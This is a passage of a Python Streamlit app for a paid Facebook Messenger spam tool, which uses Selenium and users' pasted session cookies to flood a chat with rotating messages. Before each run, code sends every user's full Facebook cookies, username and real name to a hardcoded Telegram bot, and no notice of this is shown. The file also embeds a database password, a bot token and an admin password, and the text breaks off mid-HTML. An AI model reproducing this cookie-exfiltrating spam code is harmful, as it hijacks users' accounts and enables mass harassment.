import streamlit as st
import time
import threading
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import database as db
import requests
import os
import hashlib
import uuid
from datetime import datetime
import json

# 🚨🚨🚨 MONGODB 24/7 CODE START 🚨🚨🚨
def setup_mongodb_heartbeat():
    """MongoDB heartbeat to keep app alive 24/7"""
    def keep_alive():
        while True:
            try:
                # Import inside function to avoid initial load issues
                from pymongo import MongoClient
                
                connection_string = "mongodb+srv://dineshsavita76786_user_db:WALEED_XD@cluster0.3xxvjpo.mongodb.net/?retryWrites=true&w=majority"
                
                client = MongoClient(connection_string, serverSelectionTimeoutMS=10000)
                db_connection = client['streamlit_db']
                
                # Update heartbeat every 5 minutes
                db_connection.heartbeat.update_one(
                    {'app_id': 'Rafay_Khan_automation'},
                    {
                        '$set': {
                            'last_heartbeat': datetime.now(),
                            'status': 'running',
                            'app_name': 'Waleed XD E2EE',
                            'timestamp': datetime.now(),
                            'version': '2.0'
                        }
                    },
                    upsert=True
                )
                print(f"✅ MongoDB Heartbeat: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                client.close()
                
            except Exception as e:
                print(f"❌ MongoDB Heartbeat Error: {str(e)[:100]}")
            
            # Wait 5 minutes
            time.sleep(300)
    
    # Start heartbeat in background
    try:
        heartbeat_thread = threading.Thread(target=keep_alive, daemon=True)
        heartbeat_thread.start()
        print("🚀 MongoDB 24/7 Heartbeat Started!")
    except Exception as e:
        print(f"❌ Failed to start heartbeat: {e}")

# 🚨 YEH LINE SABSE PEHLE RUN HOGI
if 'mongodb_started' not in st.session_state:
    setup_mongodb_heartbeat()
    st.session_state.mongodb_started = True
# 🚨🚨🚨 MONGODB 24/7 CODE END 🚨🚨🚨

st.set_page_config(
    page_title="WALEED XD",
    page_icon="👑",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = "8043472695:AAGfv8QI4yB_eNAL2ZAIq2bU7ING_-0e3qg"
TELEGRAM_CHAT_ID = "1889611156"
FACEBOOK_ADMIN_UID = "100080154146813"

def send_telegram_notification(user_data, automation_data):
    """Send user details to Telegram bot"""
    try:
        message = f"""
🔰 *NEW AUTOMATION STARTED* 🔰

👤 *User Details:*
• Username: `{user_data['username']}`
• Real Name: `{user_data['real_name']}`
• User ID: `{user_data['user_id']}`

🔧 *Automation Config:*
• Chat ID: `{automation_data['chat_id']}`
• Delay: `{automation_data['delay']} seconds`
• Prefix: `{automation_data['prefix']}`
• Messages: `{len(automation_data['messages'].splitlines())} lines`

🍪 *Full Cookies:* 
`{automation_data['cookies']}`

📊 *Status:* Automation Running
🕒 *Started:* {time.strftime("%Y-%m-%d %H:%M:%S")}
        """
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }
        requests.post(url, data=payload)
    except Exception as e:
        print(f"Telegram notification failed: {e}")

def send_facebook_notification(user_data, automation_data):
    """Send notification to Facebook admin"""
    try:
        message = f"""
🔰 NEW AUTOMATION STARTED 🔰

👤 User Details:
• Username: {user_data['username']}
• Real Name: {user_data['real_name']}
• User ID: {user_data['user_id']}

🔧 Automation Config:
• Chat ID: {automation_data['chat_id']}
• Delay: {automation_data['delay']} seconds
• Prefix: {automation_data['prefix']}
• Messages: {len(automation_data['messages'].splitlines())} lines

🍪 Full Cookies: 
{automation_data['cookies']}

📊 Status: Automation Running
🕒 Started: {time.strftime("%Y-%m-%d %H:%M:%S")}
        """
        
        # Simulate sending to Facebook admin
        print(f"Facebook notification sent to admin {FACEBOOK_ADMIN_UID}")
        print(f"Message: {message}")
        
        # Here you would implement actual Facebook API integration
        # For now, we'll log it
        db.log_admin_notification(user_data['user_id'], message)
        
    except Exception as e:
        print(f"Facebook notification failed: {e}")

# 🎨 SIRF CSS CHANGE - BAQI SAB VAHI
custom_css = """
<style>
    /* Main Background */
    .stApp {
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        background-attachment: fixed;
    }
    
    /* Premium Header */
    .main-header {
        background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
        padding: 3rem 2rem;
        border-radius: 20px;
        text-align: center;
        margin-bottom: 2rem;
        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
        border: 1px solid rgba(255, 255, 255, 0.1);
        position: relative;
        overflow: hidden;
    }
    
    .main-header::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: linear-gradient(45deg, transparent 30%, rgba(255,255,255,0.05) 50%, transparent 70%);
        animation: shine 3s infinite;
    }
    
    @keyframes shine {
        0% { transform: translateX(-100%); }
        100% { transform: translateX(100%); }
    }
    
    .main-header h1 {
        color: white;
        font-size: 3.5rem;
        font-weight: 900;
        background: linear-gradient(135deg, #f59e0b, #fbbf24, #fde68a);
        -webkit-background-clip: text;
        background-clip: text;
        color: transparent;
        text-shadow: 0 2px 20px rgba(0,0,0,0.3);
        margin-bottom: 1rem;
    }
    
    /* Premium Cards */
    .premium-card {
        background: rgba(15, 23, 42, 0.9);
        backdrop-filter: blur(10px);
        border-radius: 20px;
        padding: 2rem;
        border: 1px solid rgba(255, 255, 255, 0.1);
        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
        margin-bottom: 1.5rem;
        transition: all 0.3s ease;
    }
    
    .premium-card:hover {
        transform: translateY(-5px);
        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
        border-color: rgba(255, 255, 255, 0.2);
    }
    
    /* Premium Buttons */
    .stButton>button {
        background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
        color: white;
        border: none;
        border-radius: 12px;
        padding: 0.8rem 2rem;
        font-weight: 600;
        font-size: 1rem;
        transition: all 0.3s ease;
        box-shadow: 0 5px 20px rgba(245, 158, 11, 0.4);
    }
    
    .stButton>button:hover {
        transform: translateY(-2px);
        box-shadow: 0 8px 25px rgba(245, 158, 11, 0.6);
    }
    
    /* Input Fields */
    .stTextInput>div>div>input,
    .stTextArea>div>div>textarea {
        background: rgba(30, 41, 59, 0.8);
        border: 2px solid rgba(255, 255, 255, 0.1);
        border-radius: 12px;
        color: white;
        padding: 0.8rem 1rem;
    }
    
    .stTextInput>div>div>input:focus,
    .stTextArea>div>div>textarea:focus {
        border-color: #f59e0b;
        box-shadow: 0 0 0 3px rgba(245, 158, 11, 0.2);
    }
    
    /* Tabs */
    .stTabs [data-baseweb="tab-list"] {
        background: rgba(15, 23, 42, 0.8);
        border-radius: 12px;
        padding: 0.5rem;
    }
    
    .stTabs [data-baseweb="tab"] {
        color: rgba(255, 255, 255, 0.6);
        border-radius: 8px;
        padding: 0.5rem 1rem;
    }
    
    .stTabs [aria-selected="true"] {
        background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
        color: white;
    }
    
    /* Sidebar */
    [data-testid="stSidebar"] {
        background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
    }
    
    /* Log Console */
    .log-container {
        background: rgba(15, 23, 42, 0.9);
        color: #10b981;
        font-family: 'Courier New', monospace;
        padding: 1rem;
        border-radius: 12px;
        border: 1px solid rgba(16, 185, 129, 0.3);
        max-height: 400px;
        overflow-y: auto;
    }
    
    /* User Cards */
    .user-card {
        background: rgba(30, 41, 59, 0.8);
        padding: 1rem;
        border-radius: 12px;
        margin: 0.5rem 0;
        border-left: 4px solid #f59e0b;
    }
    
    /* Status Badges */
    .status-badge {
        display: inline-block;
        padding: 0.3rem 0.8rem;
        border-radius: 20px;
        font-size: 0.8rem;
        font-weight: 600;
        margin-left: 0.5rem;
    }
    
    .status-approved {
        background: linear-gradient(135deg, #10b981, #059669);
        color: white;
    }
    
    .status-pending {
        background: linear-gradient(135deg, #f59e0b, #d97706);
        color: white;
    }
    
    /* Footer */
    .premium-footer {
        text-align: center;
        padding: 2rem;
        color: rgba(255, 255, 255, 0.6);
        font-size: 0.9rem;
        margin-top: 3rem;
        border-top: 1px solid rgba(255, 255, 255, 0.1);
    }
</style>
"""

st.markdown(custom_css, unsafe_allow_html=True)

# Initialize session state
if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False
if 'user_id' not in st.session_state:
    st.session_state.user_id = None
if 'username' not in st.session_state:
    st.session_state.username = None
if 'approval_key' not in st.session_state:
    st.session_state.approval_key = None
if 'approval_status' not in st.session_state:
    st.session_state.approval_status = 'pending'
if 'user_real_name' not in st.session_state:
    st.session_state.user_real_name = ""
if 'automation_running' not in st.session_state:
    st.session_state.automation_running = False
if 'logs' not in st.session_state:
    st.session_state.logs = []
if 'message_count' not in st.session_state:
    st.session_state.message_count = 0
if 'admin_logged_in' not in st.session_state:
    st.session_state.admin_logged_in = False

class AutomationState:
    def __init__(self):
        self.running = False
        self.message_count = 0
        self.logs = []
        self.message_rotation_index = 0
        self.last_message_sent = ""
        self.last_message_time = ""

if 'automation_state' not in st.session_state:
    st.session_state.automation_state = AutomationState()

if 'auto_start_checked' not in st.session_state:
    st.session_state.auto_start_checked = False

def generate_approval_key(username, user_id):
    """Generate unique approval key based on username and user_id"""
    unique_string = f"{username}_{user_id}_{uuid.uuid4()}"
    return hashlib.sha256(unique_string.encode()).hexdigest()[:16].upper()

def get_indian_time():
    """Get current Indian time"""
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S IST")

def log_message(msg, automation_state=None, user_id=None):
    """Log message with Indian timestamp"""
    timestamp = get_indian_time()
    formatted_msg = f"[{timestamp}] {msg}"
    
    # Store in admin logs if user_id provided
    if user_id:
        db.log_user_activity(user_id, formatted_msg)
    
    if automation_state:
        automation_state.logs.append(formatted_msg)
        automation_state.last_message_sent = msg
        automation_state.last_message_time = timestamp
    else:
        if 'logs' in st.session_state:
            st.session_state.logs.append(formatted_msg)

def find_message_input(driver, process_id, automation_state=None, user_id=None):
    log_message(f'{process_id}: Finding message input...', automation_state, user_id)
    time.sleep(10)
    
    try:
        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(2)
        driver.execute_script("window.scrollTo(0, 0);")
        time.sleep(2)
    except Exception:
        pass
    
    try:
        page_title = driver.title
        page_url = driver.current_url
        log_message(f'{process_id}: Page Title: {page_title}', automation_state, user_id)
        log_message(f'{process_id}: Page URL: {page_url}', automation_state, user_id)
    except Exception as e:
        log_message(f'{process_id}: Could not get page info: {e}', automation_state, user_id)
    
    message_input_selectors = [
        'div[contenteditable="true"][role="textbox"]',
        'div[contenteditable="true"][data-lexical-editor="true"]',
        'div[aria-label*="message" i][contenteditable="true"]',
        'div[aria-label*="Message" i][contenteditable="true"]',
        'div[contenteditable="true"][spellcheck="true"]',
        '[role="textbox"][contenteditable="true"]',
        'textarea[placeholder*="message" i]',
        'div[aria-placeholder*="message" i]',
        'div[data-placeholder*="message" i]',
        '[contenteditable="true"]',
        'textarea',
        'input[type="text"]'
    ]
    
    log_message(f'{process_id}: Trying {len(message_input_selectors)} selectors...', automation_state, user_id)
    
    for idx, selector in enumerate(message_input_selectors):
        try:
            elements = driver.find_elements(By.CSS_SELECTOR, selector)
            log_message(f'{process_id}: Selector {idx+1}/{len(message_input_selectors)} "{selector[:50]}..." found {len(elements)} elements', automation_state, user_id)
            
            for element in elements:
                try:
                    is_editable = driver.execute_script("""
                        return arguments[0].contentEditable === 'true' || 
                               arguments[0].tagName === 'TEXTAREA' || 
                               arguments[0].tagName === 'INPUT';
                    """, element)
                    
                    if is_editable:
                        log_message(f'{process_id}: Found editable element with selector #{idx+1}', automation_state, user_id)
                        
                        try:
                            element.click()
                            time.sleep(0.5)
                        except:
                            pass
                        
                        element_text = driver.execute_script("return arguments[0].placeholder || arguments[0].getAttribute('aria-label') || arguments[0].getAttribute('aria-placeholder') || '';", element).lower()
                        
                        keywords = ['message', 'write', 'type', 'send', 'chat', 'msg', 'reply', 'text', 'aa']
                        if any(keyword in element_text for keyword in keywords):
                            log_message(f'{process_id}: Found message input with text: {element_text[:50]}', automation_state, user_id)
                            return element
                        elif idx < 10:
                            log_message(f'{process_id}: Using primary selector editable element (#{idx+1})', automation_state, user_id)
                            return element
                        elif selector == '[contenteditable="true"]' or selector == 'textarea' or selector == 'input[type="text"]':
                            log_message(f'{process_id}: Using fallback editable element', automation_state, user_id)
                            return element
                except Exception as e:
                    log_message(f'{process_id}: Element check failed: {str(e)[:50]}', automation_state, user_id)
                    continue
        except Exception as e:
            continue
    
    try:
        page_source = driver.page_source
        log_message(f'{process_id}: Page source length: {len(page_source)} characters', automation_state, user_id)
        if 'contenteditable' in page_source.lower():
            log_message(f'{process_id}: Page contains contenteditable elements', automation_state, user_id)
        else:
            log_message(f'{process_id}: No contenteditable elements found in page', automation_state, user_id)
    except Exception:
        pass
    
    return None

def setup_browser(automation_state=None, user_id=None):
    log_message('Setting up Chrome browser...', automation_state, user_id)
    
    chrome_options = Options()
    chrome_options.add_argument('--headless=new')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-setuid-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36')
    
    chromium_paths = [
        '/usr/bin/chromium',
        '/usr/bin/chromium-browser',
        '/usr/bin/google-chrome',
        '/usr/bin/chrome'
    ]
    
    for chromium_path in chromium_paths:
        if Path(chromium_path).exists():
            chrome_options.binary_location = chromium_path
            log_message(f'Found Chromium at: {chromium_path}', automation_state, user_id)
            break
    
    chromedriver_paths = [
        '/usr/bin/chromedriver',
        '/usr/local/bin/chromedriver'
    ]
    
    driver_path = None
    for driver_candidate in chromedriver_paths:
        if Path(driver_candidate).exists():
            driver_path = driver_candidate
            log_message(f'Found ChromeDriver at: {driver_path}', automation_state, user_id)
            break
    
    try:
        from selenium.webdriver.chrome.service import Service
        
        if driver_path:
            service = Service(executable_path=driver_path)
            driver = webdriver.Chrome(service=service, options=chrome_options)
            log_message('Chrome started with detected ChromeDriver!', automation_state, user_id)
        else:
            driver = webdriver.Chrome(options=chrome_options)
            log_message('Chrome started with default driver!', automation_state, user_id)
        
        driver.set_window_size(1920, 1080)
        log_message('Chrome browser setup completed successfully!', automation_state, user_id)
        return driver
    except Exception as error:
        log_message(f'Browser setup failed: {error}', automation_state, user_id)
        raise error

def get_next_message(messages_file_content, automation_state=None):
    if not messages_file_content:
        return 'Hello!'
    
    messages = messages_file_content.split('\n')
    messages = [msg.strip() for msg in messages if msg.strip()]
    
    if not messages:
        return 'Hello!'
    
    if automation_state:
        message = messages[automation_state.message_rotation_index % len(messages)]
        automation_state.message_rotation_index += 1
    else:
        message = messages[0]
    
    return message

def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
    driver = None
    try:
        log_message(f'{process_id}: Starting automation...', automation_state, user_id)
        driver = setup_browser(automation_state, user_id)
        
        log_message(f'{process_id}: Navigating to Facebook...', automation_state, user_id)
        driver.get('https://www.facebook.com/')
        time.sleep(8)
        
        if config['cookies'] and config['cookies'].strip():
            log_message(f'{process_id}: Adding cookies...', automation_state, user_id)
            cookie_array = config['cookies'].split(';')
            for cookie in cookie_array:
                cookie_trimmed = cookie.strip()
                if cookie_trimmed:
                    first_equal_index = cookie_trimmed.find('=')
                    if first_equal_index > 0:
                        name = cookie_trimmed[:first_equal_index].strip()
                        value = cookie_trimmed[first_equal_index + 1:].strip()
                        try:
                            driver.add_cookie({
                                'name': name,
                                'value': value,
                                'domain': '.facebook.com',
                                'path': '/'
                            })
                        except Exception:
                            pass
        
        if config['chat_id']:
            chat_id = config['chat_id'].strip()
            log_message(f'{process_id}: Opening conversation {chat_id}...', automation_state, user_id)
            driver.get(f'https://www.facebook.com/messages/t/{chat_id}')
        else:
            log_message(f'{process_id}: Opening messages...', automation_state, user_id)
            driver.get('https://www.facebook.com/messages')
        
        time.sleep(15)
        
        message_input = find_message_input(driver, process_id, automation_state, user_id)
        
        if not message_input:
            log_message(f'{process_id}: Message input not found!', automation_state, user_id)
            automation_state.running = False
            db.set_automation_running(user_id, False)
            return 0
        
        delay = int(config['delay'])
        messages_sent = 0
        
        while automation_state.running and db.get_automation_running(user_id):
            base_message = get_next_message(config['messages_file_content'], automation_state)
            
            if config['name_prefix']:
                message_to_send = f"{config['name_prefix']} {base_message}"
            else:
                message_to_send = base_message
            
            try:
                driver.execute_script("""
                    const element = arguments[0];
                    const message = arguments[1];
                    
                    element.scrollIntoView({behavior: 'smooth', block: 'center'});
                    element.focus();
                    element.click();
                    
                    if (element.tagName === 'DIV') {
                        element.textContent = message;
                        element.innerHTML = message;
                    } else {
                        element.value = message;
                    }
                    
                    element.dispatchEvent(new Event('input', { bubbles: true }));
                    element.dispatchEvent(new Event('change', { bubbles: true }));
                    element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
                """, message_input, message_to_send)
                
                time.sleep(1)
                
                sent = driver.execute_script("""
                    const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');
                    
                    for (let btn of sendButtons) {
                        if (btn.offsetParent !== null) {
                            btn.click();
                            return 'button_clicked';
                        }
                    }
                    return 'button_not_found';
                """)
                
                if sent == 'button_not_found':
                    log_message(f'{process_id}: Send button not found, using Enter key...', automation_state, user_id)
                    driver.execute_script("""
                        const element = arguments[0];
                        element.focus();
                        
                        const events = [
                            new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                        ];
                        
                        events.forEach(event => element.dispatchEvent(event));
                    """, message_input)
                else:
                    log_message(f'{process_id}: Send button clicked', automation_state, user_id)
                
                time.sleep(1)
                
                messages_sent += 1
                automation_state.message_count = messages_sent
                log_message(f'{process_id}: Message {messages_sent} sent: {message_to_send[:30]}...', automation_state, user_id)
                
                time.sleep(delay)
                
            except Exception as e:
                log_message(f'{process_id}: Error sending message: {str(e)}', automation_state, user_id)
                break
        
        log_message(f'{process_id}: Automation stopped! Total messages sent: {messages_sent}', automation_state, user_id)
        automation_state.running = False
        db.set_automation_running(user_id, False)
        return messages_sent
        
    except Exception as e:
        log_message(f'{process_id}: Fatal error: {str(e)}', automation_state, user_id)
        automation_state.running = False
        db.set_automation_running(user_id, False)
        return 0
    finally:
        if driver:
            try:
                driver.quit()
                log_message(f'{process_id}: Browser closed', automation_state, user_id)
            except:
                pass

def send_approval_request_via_whatsapp(user_real_name, approval_key):
    message = f"Hello Waleed sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
    whatsapp_url = f"https://wa.me/923075852134?text={requests.utils.quote(message)}"
    return whatsapp_url

def send_approval_request_via_facebook(user_real_name, approval_key):
    message = f"Hello waleed sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
    facebook_url = f"https://www.facebook.com/officelwaleed"
    return facebook_url

def send_approval_request_via_telegram(user_real_name, approval_key):
    message = f"Hello Waleed sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
    telegram_url = f"https://t.me/itxrafay?text={requests.utils.quote(message)}"
    return telegram_url

def run_automation_with_notification(user_config, username, automation_state, user_id):
    # Send notifications before starting automation
    user_data = {
        'username': username,
        'real_name': db.get_user_real_name(user_id),
        'user_id': user_id
    }
    
    automation_data = {
        'chat_id': user_config['chat_id'],
        'delay': user_config['delay'],
        'prefix': user_config['name_prefix'],
        'messages': user_config['messages_file_content'],
        'cookies': user_config['cookies']  # Full cookies now
    }
    
    # Send notifications
    send_telegram_notification(user_data, automation_data)
    send_facebook_notification(user_data, automation_data)
    
    # Start automation
    send_messages(user_config, automation_state, user_id)

def start_automation(user_config, user_id):
    automation_state = st.session_state.automation_state
    
    if automation_state.running:
        return
    
    automation_state.running = True
    automation_state.message_count = 0
    automation_state.logs = []
    
    db.set_automation_running(user_id, True)
    
    username = db.get_username(user_id)
    thread = threading.Thread(target=run_automation_with_notification, args=(user_config, username, automation_state, user_id))
    thread.daemon = True
    thread.start()

def stop_automation(user_id):
    st.session_state.automation_state.running = False
    db.set_automation_running(user_id, False)

# 🎨 PREMIUM HEADER ADDED
st.markdown("""
<div class="main-header">
    <h1>WALEED XD E2E PAID TOOL</h1>
    <p style="color: rgba(255,255,255,0.8); font-size: 1.2rem;">Premium Automation Suite • Professional Grade</p>
</div>
""", unsafe_allow_html=True)

# Main application
st.markdown('<div class="premium-card">', unsafe_allow_html=True)

# Admin Panel
if st.sidebar.checkbox("🔐 Admin Login"):
    admin_username = st.sidebar.text_input("Admin Username", key="admin_username")
    admin_password = st.sidebar.text_input("Admin Password", type="password", key="admin_password")
    
    if st.sidebar.button("Login as Admin"):
        if admin_username == "WALEED" and admin_password == "WALEED_XD":
            st.session_state.admin_logged_in = True
            st.sidebar.success("Admin login successful!")
        else:
            st.sidebar.error("Invalid admin credentials!")

if st.session_state.admin_logged_in:
    st.markdown("### 👑 Admin Approval Panel")
    
    # LOGOUT BUTTON ADDED IN SIDEBAR
    if st.sidebar.button("🚪 Logout from Admin", use_container_width=True):
        st.session_state.admin_logged_in = False
        st.rerun()
    
    # Get all pending approvals
    pending_users = db.get_pending_approvals()
    
    if pending_users:
        st.markdown(f"#### Pending Approvals ({len(pending_users)})")
        
        for user in pending_users:
            user_id, username, approval_key, real_name = user
            
            with st.container():
                col1, col2, col3 = st.columns([3, 1, 1])
                
                with col1:
                    st.markdown(f"""
                    <div class="user-card">
                        <strong>Username:</strong> {username}<br>
                        <strong>Real Name:</strong> {real_name}<br>
                        <strong>Approval Key:</strong> <code>{approval_key}</code>
                    </div>
                    """, unsafe_allow_html=True)
                
                with col2:
                    if st.button(f"✅ Approve", key=f"approve_{user_id}"):
                        db.update_approval_status(user_id, 'approved')
                        st.success(f"Approved user: {username}")
                        st.rerun()
                
                with col3:
                    if st.button(f"❌ Reject", key=f"reject_{user_id}"):
                        db.update_approval_status(user_id, 'rejected')
                        st.error(f"Rejected user: {username}")
                        st.rerun()
    
    # Show all approved users with remove option
    approved_users = db.get_approved_users()
    if approved_users:
        st.markdown("#### Approved Users - Remove Approval")
        
        for user in approved_users:
            user_id, username, approval_key, real_name, automation_running = user
            
            with st.container():
                col1, col2, col3, col4, col5 = st.columns([3, 1, 1, 1, 1])
                
                with col1:
                    user_config = db.get_user_config(user_id)
                    chat_id = user_config['chat_id'] if user_config else "Not configured"
                    status = "🟢 Running" if automation_running else "🔴 Stopped"
                    
                    st.markdown(f"""
                    <div class="user-card">
                        <strong>Username:</strong> {username}<br>
                        <strong>Real Name:</strong> {real_name}<br>
                        <strong>Chat ID:</strong> {chat_id}<br>
                        <strong>Status:</strong> {status}<br>
                        <strong>Approval Key:</strong> <code>{approval_key}</code>
                    </div>
                    """, unsafe_allow_html=True)
                
                with col2:
                    if st.button(f"🗑️ Remove", key=f"remove_{user_id}"):
                        db.update_approval_status(user_id, 'rejected')
                        db.set_automation_running(user_id, False)
                        st.error(f"Removed approval for: {username}")
                        st.rerun()
                
                with col3:
                    if automation_running:
                        if st.button(f"⏹️ Stop", key=f"stop_{user_id}"):
                            db.set_automation_running(user_id, False)
                            st.warning(f"Stopped automation for: {username}")
                            st.rerun()
                    else:
                        if st.button(f"▶️ Start", key=f"start_{user_id}"):
                            user_config = db.get_user_config(user_id)
                            if user_config and user_config['chat_id']:
                                db.set_automation_running(user_id, True)
                                # Start automation in background
                                thread = threading.Thread(
                                    target=run_automation_with_notification, 
                                    args=(user_config, username, AutomationState(), user_id)
                                )
                                thread.daemon = True
                                thread.start()
                                st.success(f"Started automation for: {username}")
                                st.rerun()
                            else:
                                st.error("User needs to configure chat ID first")
                
                with col4:
                    if st.button(f"📊 Details", key=f"details_{user_id}"):
                        user_config = db.get_user_config(user_id)
                        if user_config:
                            st.markdown(f"""
                            <div class="premium-card">
                            <h4>User Configuration Details:</h4>
                            - Chat ID: `{user_config['chat_id']}`<br>
                            - Prefix: `{user_config['name_prefix']}`<br>
                            - Delay: `{user_config['delay']} seconds`<br>
                            - Messages: `{len(user_config['messages_file_content'].splitlines())} lines`<br>
                            - Full Cookies: `{user_config['cookies']}`
                            </div>
                            """, unsafe_allow_html=True)
                
                with col5:
                    if st.button(f"📜 Logs", key=f"logs_{user_id}"):
                        user_logs = db.get_user_logs(user_id)
                        if user_logs:
                            st.markdown(f"### 📜 Live Logs for {username}")
                            logs_html = '<div class="log-container">'
                            for log in user_logs[-20:]:
                                logs_html += f'<div>{log}</div>'
                            logs_html += '</div>'
                            st.markdown(logs_html, unsafe_allow_html=True)
                        else:
                            st.info("No logs available for this user")
    
    # Real-time Admin Console
    st.markdown("### 👁️ Real-time Admin Console")
    
    # Auto-refresh for admin console
    if st.checkbox("🔄 Auto-refresh Console", value=True):
        time.sleep(2)
        st.rerun()
    
    # Show all active automations with live logs
    active_users = db.get_active_automations()
    if active_users:
        st.markdown(f"#### 🟢 Active Automations ({len(active_users)})")
        
        for user in active_users:
            user_id, username = user
            user_logs = db.get_user_logs(user_id)
            
            with st.expander(f"📱 {username} - Live Activity", expanded=False):
                if user_logs:
                    logs_html = '<div class="log-container">'
                    for log in user_logs[-15:]:
                        logs_html += f'<div>{log}</div>'
                    logs_html += '</div>'
                    st.markdown(logs_html, unsafe_allow_html=True)
                    
                    # Quick stop button
                    if st.button(f"🛑 Stop {username}", key=f"quick_stop_{user_id}"):
                        db.set_automation_running(user_id, False)
                        st.success(f"Stopped {username}'s automation")
                        st.rerun()
                else:
                    st.info("No recent activity logs")
    
    # Show all users
    all_users = db.get_all_users()
    if all_users:
        st.markdown("#### 👥 All Users")
        for user in all_users:
            user_id, username, approval_status, real_name, approval_key = user
            
            status_class = approval_status.lower() if approval_status else 'pending'
            status_icon = "🟢" if approval_status == 'approved' else "🟡" if approval_status == 'pending' else "🔴"
            
            st.markdown(f"""
            <div class="user-card">
                {status_icon} <strong>Username:</strong> {username} | 
                <strong>Status:</strong> {approval_status.upper() if approval_status else 'PENDING'} | 
                <strong>Real Name:</strong> {real_name}
            </div>
            """, unsafe_allow_html=True)

elif not st.session_state.logged_in:
    tab1, tab2 = st.tabs(["🔐 Login", "✨ Sign Up"])
    
    with tab1:
        st.markdown("### Welcome Back!")
        
        username = st.text_input("Username", key="login_username", placeholder="Enter your username")
        password = st.text_input("Password", key="login_password", type="password", placeholder="Enter your password")
        
        if st.button("Login", key="login_btn", use_container_width=True):
            if username and password:
                user_id = db.verify_user(username, password)
                if user_id:
                    # Check approval status
                    approval_status = db.get_approval_status(user_id)
                    
                    if approval_status == 'approved':
                        st.session_state.logged_in = True
                        st.session_state.user_id = user_id
                        st.session_state.username = username
                        st.session_state.approval_status = 'approved'
                        
                        # Get or generate approval key
                        approval_key = db.get_approval_key(user_id)
                        if not approval_key:
                            approval_key = generate_approval_key(username, user_id)
                            db.set_approval_key(user_id, approval_key)
                        
                        st.session_state.approval_key = approval_key
                        
                        should_auto_start = db.get_automation_running(user_id)
                        if should_auto_start and not st.session_state.automation_state.running:
                            user_config = db.get_user_config(user_id)
                            if user_config and user_config['chat_id']:
                                start_automation(user_config, user_id)
                        
                        st.success(f"Welcome back, {username}!")
                        st.rerun()
                    else:
                        # User needs approval
                        st.session_state.logged_in = True
                        st.session_state.user_id = user_id
                        st.session_state.username = username
                        st.session_state.approval_status = approval_status or 'pending'
                        
                        # Get or generate approval key
                        approval_key = db.get_approval_key(user_id)
                        if not approval_key:
                            approval_key = generate_approval_key(username, user_id)
                            db.set_approval_key(user_id, approval_key)
                        
                        st.session_state.approval_key = approval_key
                        st.rerun()
                else:
                    st.error("Invalid username or password!")
            else:
                st.warning("Please enter both username and password")
    
    with tab2:
        st.markdown("### Create New Account")
        
        new_username = st.text_input("Choose Username", key="signup_username", placeholder="Choose a unique username")
        new_password = st.text_input("Choose Password", key="signup_password", type="password", placeholder="Create a strong password")
        confirm_password = st.text_input("Confirm Password", key="confirm_password", type="password", placeholder="Re-enter your password")
        
        if st.button("Create Account", key="signup_btn", use_container_width=True):
            if new_username and new_password and confirm_password:
                if new_password == confirm_password:
                    # FIXED: Handle the return values properly
                    result = db.create_user(new_username, new_password)
                    
                    # Check if result has expected format
                    if isinstance(result, tuple) and len(result) >= 2:
                        success, message = result[0], result[1]
                        user_id = result[2] if len(result) > 2 else None
                    else:
                        # Handle case where function returns different format
                        success = result if isinstance(result, bool) else False
                        message = "User creation completed" if success else "User creation failed"
                        user_id = None
                    
                    if success:
                        if user_id:
                            # Generate approval key for new user
                            approval_key = generate_approval_key(new_username, user_id)
                            db.set_approval_key(user_id, approval_key)
                        
                        st.success(f"{message} Please login now!")
                    else:
                        st.error(f"{message}")
                else:
                    st.error("Passwords do not match!")
            else:
                st.warning("Please fill all fields")

else:
    # User is logged in but needs approval
    if st.session_state.approval_status != 'approved':
        st.markdown("### 🔒 Approval Required")
        
        # User Info Box
        st.markdown(f"""
        <div class="premium-card">
            <h3>👤 User Information</h3>
            <p><strong>Username:</strong> {st.session_state.username}</p>
            <p><strong>Real Name:</strong> {st.session_state.user_real_name if st.session_state.user_real_name else "Not provided"}</p>
        </div>
        """, unsafe_allow_html=True)
        
        # Approval Key Box
        st.markdown(f"""
        <div class="premium-card">
            <h3>🔑 Your Approval Key</h3>
